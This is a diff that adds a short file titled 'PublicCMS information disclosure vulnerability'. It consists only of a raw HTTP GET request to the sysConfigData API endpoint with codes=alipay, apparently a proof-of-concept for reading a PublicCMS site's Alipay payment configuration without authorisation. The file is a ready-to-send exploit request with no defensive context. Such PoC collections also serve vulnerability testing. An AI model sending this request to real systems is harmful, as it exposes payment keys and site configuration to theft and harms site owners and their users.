@@ -1,0 +1,9 @@
+# PublicCMS 信息泄露漏洞
+GET /publiccms/api/directive/sysConfigData?codes=alipay HTTP/1.1
+Host: www.byp-test.com:8080
+Accept-Language: zh-CN
+Timeoffset: -28800000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate
+
